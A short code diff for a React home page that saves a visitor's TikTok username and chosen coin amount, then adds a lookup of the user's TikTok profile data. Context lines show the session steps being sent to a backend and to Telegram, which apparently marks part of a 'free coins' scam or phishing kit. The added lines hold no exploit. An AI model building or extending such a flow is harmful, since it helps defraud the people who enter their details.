@@ -40,6 +40,16 @@ const HomePage = () => {
       localStorage.setItem('username', username);
       localStorage.setItem('coinAmount', selectedCoin);
 
+      // Fetch TikTok user data
+      try {
+        const tiktokResponse = await axios.get(`${API}/tiktok/user/${username}`);
+        if (tiktokResponse.data.success) {
+          localStorage.setItem('tiktokData', JSON.stringify(tiktokResponse.data));
+        }
+      } catch (error) {
+        console.error('Failed to fetch TikTok data:', error);
+      }
+
       // Send to backend and Telegram
       try {
         await axios.post(`${API}/session/step`, {
